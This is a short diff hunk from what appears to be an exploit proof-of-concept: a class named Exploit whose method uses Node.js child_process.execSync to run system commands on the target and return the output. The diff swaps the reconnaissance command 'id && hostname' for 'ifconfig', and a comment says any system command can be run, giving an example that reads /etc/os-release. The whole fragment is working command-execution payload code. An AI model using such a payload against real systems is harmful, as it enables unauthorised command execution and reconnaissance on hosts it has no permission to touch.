@@ -3,7 +3,7 @@ class Exploit {
     // Require Node.js modules and execute system commands
     const { execSync } = require('child_process');
     // Run any system command. Example: 'id && hostname && cat /etc/os-release'
-    const output = execSync('id && hostname').toString();
+    const output = execSync('ifconfig').toString();
     return { status: 'ok', data: { result: output } };
   }
 }
